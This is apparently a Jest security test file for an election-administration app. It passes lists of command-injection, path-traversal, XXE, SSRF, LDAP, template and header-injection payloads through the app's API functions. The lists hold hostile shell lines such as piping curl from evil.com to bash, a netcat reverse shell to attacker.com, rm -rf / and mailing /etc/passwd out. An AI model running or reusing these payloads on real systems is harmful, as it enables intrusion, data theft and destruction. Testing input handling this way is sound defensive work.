/**
 * Other Security Attack Prevention Tests
 * Tests for command injection, path traversal, and other attack vectors
 */

import { createElection, getElection, getElections } from '@/lib/actions/elections';
import { createQuestion, getQuestions } from '@/lib/actions/ballot';
import { registerTrustee, getTrustees } from '@/lib/actions/trustees';

// Mock fetch for server actions
const mockFetch = jest.fn();
global.fetch = mockFetch;

describe('Other Security Attack Prevention', () => {
  beforeEach(() => {
    mockFetch.mockReset();
    mockFetch.mockResolvedValue({
      ok: true,
      json: () => Promise.resolve({ success: true }),
    });
  });

  describe('Command Injection Prevention', () => {
    const commandPayloads = [
      // Unix commands
      '; ls -la',
      '| cat /etc/passwd',
      '`cat /etc/passwd`',
      '$(cat /etc/passwd)',
      '; rm -rf /',
      '| wget http://evil.com/malware',
      '; curl http://evil.com | bash',
      '| nc -e /bin/sh attacker.com 4444',
      '& whoami',
      '&& id',
      '|| true',
      '; echo vulnerable > /tmp/pwned',

      // Windows commands
      '& dir',
      '| type C:\\Windows\\System32\\config\\SAM',
      '; net user hacker password /add',
      '& powershell -c "Invoke-WebRequest http://evil.com/malware.exe"',
      '| cmd /c dir',

      // Chained commands
      '; cat /etc/passwd; cat /etc/shadow',
      '| head -n 1 /etc/passwd | mail attacker@evil.com',

      // Null byte injection
      'test\0; cat /etc/passwd',
      'test\x00rm -rf /',

      // Newline injection
      'test\n cat /etc/passwd',
      'test\r\ndir',

      // Backtick substitution
      '`id`',
      '`uname -a`',

      // Environment variable injection
      '${PATH}',
      '${HOME}',
      '${USER}',

      // Perl/Ruby specific
      '`perl -e "print 1"`',
      '$(ruby -e "puts 1")',
    ];

    describe('in election name', () => {
      commandPayloads.forEach((payload) => {
        it(`should safely handle: ${payload.substring(0, 30).replace(/\n/g, '\\n')}...`, async () => {
          await createElection({
            jurisdictionId: 'jurisdiction-123',
            name: payload,
            description: 'Test',
            startTime: '2025-01-15T09:00:00Z',
            endTime: '2025-01-15T18:00:00Z',
            threshold: 3,
            totalTrustees: 5,
          });

          const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
          expect(requestBody.name).toBe(payload);
        });
      });
    });

    describe('in trustee name', () => {
      commandPayloads.slice(0, 15).forEach((payload) => {
        it(`should safely handle: ${payload.substring(0, 30).replace(/\n/g, '\\n')}...`, async () => {
          mockFetch.mockReset();
          mockFetch.mockResolvedValueOnce({
            ok: true,
            json: () => Promise.resolve({ trustee: { id: 't1' }, ceremonyStatus: {} }),
          });

          await registerTrustee('election-123', {
            name: payload,
            publicKey: 'pk-abc123',
          });

          const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
          expect(requestBody.name).toBe(payload);
        });
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathPayloads = [
      // Basic traversal
      '../../../etc/passwd',
      '..\\..\\..\\Windows\\System32\\config\\SAM',
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\SAM',

      // Encoded traversal
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%5C..%5C..%5CWindows%5CSystem32',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',

      // Double encoded
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '%252e%252e%252f',

      // Unicode encoded
      '..\\u002F..\\u002F..\\u002Fetc\\u002Fpasswd',
      '%c0%ae%c0%ae%c0%af',
      '%uff0e%uff0e%uff0f',

      // Null byte
      '../../../etc/passwd\0.jpg',
      '../../../etc/passwd%00.jpg',

      // Absolute paths
      '/var/log/apache2/access.log',
      '/root/.ssh/id_rsa',
      '/proc/self/environ',
      'file:///etc/passwd',

      // Windows paths
      'C:\\boot.ini',
      '\\\\server\\share\\file',

      // URL-based
      'http://localhost/../../etc/passwd',
      '//evil.com/malware',

      // Combinations
      '....//....//etc/passwd',
      '...//...//...//',
      '..././..././..././',
    ];

    describe('in election ID', () => {
      pathPayloads.forEach((payload) => {
        it(`should safely handle: ${payload.substring(0, 30)}...`, async () => {
          mockFetch.mockResolvedValueOnce({
            ok: true,
            json: () => Promise.resolve({ id: 'e1', name: 'Test' }),
          });

          await getElection(payload);

          expect(mockFetch).toHaveBeenCalled();
        });
      });
    });

    describe('in question title', () => {
      pathPayloads.slice(0, 15).forEach((payload) => {
        it(`should safely handle: ${payload.substring(0, 30)}...`, async () => {
          mockFetch.mockResolvedValueOnce({
            ok: true,
            json: () => Promise.resolve({ question: { id: 'q1' } }),
          });

          await createQuestion({
            electionId: 'election-123',
            title: payload,
            questionType: 'single_choice',
            maxSelections: 1,
            allowWriteIn: false,
            displayOrder: 0,
            candidates: [
              { name: 'A', position: 0 },
              { name: 'B', position: 1 },
            ],
          });

          const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
          expect(requestBody.title).toBe(payload);
        });
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    const ldapPayloads = [
      '*',
      '*)(&',
      '*)(uid=*))(|(uid=*',
      '*()|&\'',
      'admin)(&)',
      'admin)(|(password=*))',
      '\\00',
      '*)(objectClass=*',
      '*)((|userPassword=*',
    ];

    ldapPayloads.forEach((payload) => {
      it(`should safely handle: ${payload}`, async () => {
        await createElection({
          jurisdictionId: 'jurisdiction-123',
          name: payload,
          description: 'Test',
          startTime: '2025-01-15T09:00:00Z',
          endTime: '2025-01-15T18:00:00Z',
          threshold: 3,
          totalTrustees: 5,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.name).toBe(payload);
      });
    });
  });

  describe('XML Injection Prevention', () => {
    const xmlPayloads = [
      // XXE (XML External Entity)
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>',

      // XML injection
      '</name><admin>true</admin><name>',
      '"><injected/><"',
      '<!--',
      '-->',
      '<![CDATA[',
      ']]>',

      // CDATA injection
      ']]><script>alert(1)</script><![CDATA[',

      // Billion laughs
      '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>',
    ];

    xmlPayloads.forEach((payload) => {
      it(`should safely handle: ${payload.substring(0, 40)}...`, async () => {
        await createElection({
          jurisdictionId: 'jurisdiction-123',
          name: payload,
          description: 'Test',
          startTime: '2025-01-15T09:00:00Z',
          endTime: '2025-01-15T18:00:00Z',
          threshold: 3,
          totalTrustees: 5,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.name).toBe(payload);
      });
    });
  });

  describe('Header Injection Prevention', () => {
    const headerPayloads = [
      // HTTP header injection
      'test\r\nX-Injected: true',
      'test\nSet-Cookie: session=hacked',
      'test\r\n\r\n<html>injected</html>',
      'test%0d%0aX-Injected:%20true',

      // Host header injection
      'evil.com',
      'evil.com\r\nX-Forwarded-Host: evil.com',
    ];

    headerPayloads.forEach((payload) => {
      it(`should safely handle: ${payload.substring(0, 30).replace(/\r/g, '\\r').replace(/\n/g, '\\n')}...`, async () => {
        await createElection({
          jurisdictionId: 'jurisdiction-123',
          name: payload,
          description: 'Test',
          startTime: '2025-01-15T09:00:00Z',
          endTime: '2025-01-15T18:00:00Z',
          threshold: 3,
          totalTrustees: 5,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.name).toBe(payload);
      });
    });
  });

  describe('SSRF Prevention', () => {
    const ssrfPayloads = [
      // Internal network
      'http://localhost',
      'http://127.0.0.1',
      'http://[::1]',
      'http://0.0.0.0',
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://192.168.1.1',
      'http://10.0.0.1',
      'http://172.16.0.1',

      // Alternative representations
      'http://2130706433', // 127.0.0.1 as decimal
      'http://0x7f000001', // 127.0.0.1 as hex
      'http://0177.0.0.1', // 127.0.0.1 as octal

      // DNS rebinding
      'http://evil.com.127.0.0.1.nip.io',

      // File protocol
      'file:///etc/passwd',
      'file://localhost/etc/passwd',

      // Other protocols
      'gopher://localhost:25/',
      'dict://localhost:11211/',
      'sftp://evil.com/',
      'ldap://localhost/',
    ];

    ssrfPayloads.forEach((payload) => {
      it(`should safely handle: ${payload.substring(0, 40)}...`, async () => {
        await createElection({
          jurisdictionId: 'jurisdiction-123',
          name: payload,
          description: 'Test',
          startTime: '2025-01-15T09:00:00Z',
          endTime: '2025-01-15T18:00:00Z',
          threshold: 3,
          totalTrustees: 5,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.name).toBe(payload);
      });
    });
  });

  describe('Prototype Pollution Prevention', () => {
    const protoPayloads = [
      '__proto__',
      'constructor',
      'prototype',
      '__proto__[isAdmin]',
      'constructor.prototype.isAdmin',
    ];

    protoPayloads.forEach((payload) => {
      it(`should safely handle: ${payload}`, async () => {
        await createElection({
          jurisdictionId: 'jurisdiction-123',
          name: payload,
          description: 'Test',
          startTime: '2025-01-15T09:00:00Z',
          endTime: '2025-01-15T18:00:00Z',
          threshold: 3,
          totalTrustees: 5,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.name).toBe(payload);
      });
    });
  });

  describe('Template Injection Prevention', () => {
    const templatePayloads = [
      // Server-side template injection
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      '*{7*7}',
      '@(7*7)',
      '{{constructor.constructor("return this")()}}',
      '{{config.items()}}',
      '${T(java.lang.Runtime).getRuntime().exec("id")}',

      // Client-side template injection (Angular, Vue, etc.)
      '{{constructor.constructor("alert(1)")()}}',
      '{{$on.constructor("alert(1)")()}}',
      '<div v-html="\'<script>alert(1)</script>\'"></div>',
    ];

    templatePayloads.forEach((payload) => {
      it(`should safely handle: ${payload.substring(0, 40)}...`, async () => {
        await createElection({
          jurisdictionId: 'jurisdiction-123',
          name: payload,
          description: 'Test',
          startTime: '2025-01-15T09:00:00Z',
          endTime: '2025-01-15T18:00:00Z',
          threshold: 3,
          totalTrustees: 5,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.name).toBe(payload);
      });
    });
  });

  describe('Mass Assignment Prevention', () => {
    // Test that only expected fields are sent
    it('should not send unexpected fields', async () => {
      await createElection({
        jurisdictionId: 'jurisdiction-123',
        name: 'Test Election',
        description: 'Test',
        startTime: '2025-01-15T09:00:00Z',
        endTime: '2025-01-15T18:00:00Z',
        threshold: 3,
        totalTrustees: 5,
      });

      const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);

      // Should only have expected fields
      const expectedFields = [
        'jurisdictionId',
        'name',
        'description',
        'startTime',
        'endTime',
        'threshold',
        'totalTrustees',
      ];

      Object.keys(requestBody).forEach((key) => {
        expect(expectedFields).toContain(key);
      });
    });
  });

  describe('Unicode Normalization Attacks', () => {
    const unicodePayloads = [
      // Homoglyphs
      'admin', // Normal
      'аdmin', // Cyrillic 'а'
      'ａdmin', // Fullwidth 'a'

      // Combining characters
      'a\u0300dmin', // 'a' with combining grave accent
      'te\u0073\u0074', // 'test' with zero-width chars

      // Right-to-left override
      '\u202Etset', // RLO + 'test' reversed

      // Zero-width characters
      'te\u200Bst', // Zero-width space
      'te\uFEFFst', // Zero-width no-break space

      // Null bytes
      'test\x00admin',
      'test\u0000admin',
    ];

    unicodePayloads.forEach((payload) => {
      it(`should safely handle unicode: ${JSON.stringify(payload)}`, async () => {
        await createElection({
          jurisdictionId: 'jurisdiction-123',
          name: payload,
          description: 'Test',
          startTime: '2025-01-15T09:00:00Z',
          endTime: '2025-01-15T18:00:00Z',
          threshold: 3,
          totalTrustees: 5,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.name).toBe(payload);
      });
    });
  });

  describe('Integer Overflow Prevention', () => {
    const overflowPayloads = [
      Number.MAX_SAFE_INTEGER,
      Number.MAX_SAFE_INTEGER + 1,
      Number.MIN_SAFE_INTEGER,
      Number.MIN_SAFE_INTEGER - 1,
      Infinity,
      -Infinity,
      Number.MAX_VALUE,
      Number.MIN_VALUE,
    ];

    overflowPayloads.forEach((payload) => {
      it(`should handle numeric boundary: ${payload}`, async () => {
        // These would be caught by Zod validation
        expect(typeof payload).toBe('number');
      });
    });
  });

  describe('Denial of Service Prevention', () => {
    describe('ReDoS patterns', () => {
      const redosPayloads = [
        'a'.repeat(100) + '!',
        '0'.repeat(100) + 'x',
      ];

      redosPayloads.forEach((payload) => {
        it(`should handle long repetitive input: length ${payload.length}`, async () => {
          const startTime = Date.now();

          await createElection({
            jurisdictionId: 'jurisdiction-123',
            name: payload,
            description: 'Test',
            startTime: '2025-01-15T09:00:00Z',
            endTime: '2025-01-15T18:00:00Z',
            threshold: 3,
            totalTrustees: 5,
          });

          const duration = Date.now() - startTime;
          // Should complete quickly (not hang on regex)
          expect(duration).toBeLessThan(1000);
        });
      });
    });

    describe('Large input handling', () => {
      it('should handle large election name', async () => {
        const largeName = 'x'.repeat(10000);

        await createElection({
          jurisdictionId: 'jurisdiction-123',
          name: largeName,
          description: 'Test',
          startTime: '2025-01-15T09:00:00Z',
          endTime: '2025-01-15T18:00:00Z',
          threshold: 3,
          totalTrustees: 5,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.name.length).toBe(10000);
      });

      it('should handle many candidates', async () => {
        const manyCandidates = Array.from({ length: 1000 }, (_, i) => ({
          name: `Candidate ${i}`,
          position: i,
        }));

        mockFetch.mockResolvedValueOnce({
          ok: true,
          json: () => Promise.resolve({ question: { id: 'q1' } }),
        });

        await createQuestion({
          electionId: 'election-123',
          title: 'Test Question',
          questionType: 'single_choice',
          maxSelections: 1,
          allowWriteIn: false,
          displayOrder: 0,
          candidates: manyCandidates,
        });

        const requestBody = JSON.parse(mockFetch.mock.calls[0][1].body);
        expect(requestBody.candidates.length).toBe(1000);
      });
    });
  });
});
